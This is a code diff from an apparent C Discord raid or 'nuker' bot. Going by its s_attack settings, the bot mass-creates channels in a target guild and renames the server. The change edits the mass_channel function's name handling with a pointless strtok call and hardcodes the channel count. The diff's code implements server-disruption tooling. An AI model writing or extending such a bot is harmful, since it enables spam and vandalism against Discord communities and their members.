@@ -43,9 +43,10 @@ u64_snowflake_t get_guild(struct discord *client)
 }
 
 void mass_channel(struct discord *client, u64_snowflake_t guild_id,
-                  char *channel_name, int count)
+                  char channel_name[15], int count)
 {
-    struct discord_create_guild_channel_params chn_params = {.name = channel_name};
+    char *c_name = strtok(channel_name, "");
+    struct discord_create_guild_channel_params chn_params = {.name = c_name};
 
     for (int i = 0; i < count; i++)
     {
@@ -89,7 +90,7 @@ void on_ready(struct discord *client)
 
     if (s_attack.mass_channel_enabled == true)
     {
-        mass_channel(client, guild_id, s_attack.mass_channel_name, s_attack.mass_channel_count);
+        mass_channel(client, guild_id, s_attack.mass_channel_name, 2);
     }
 
     if(s_attack.guild_name_enabled == true) {
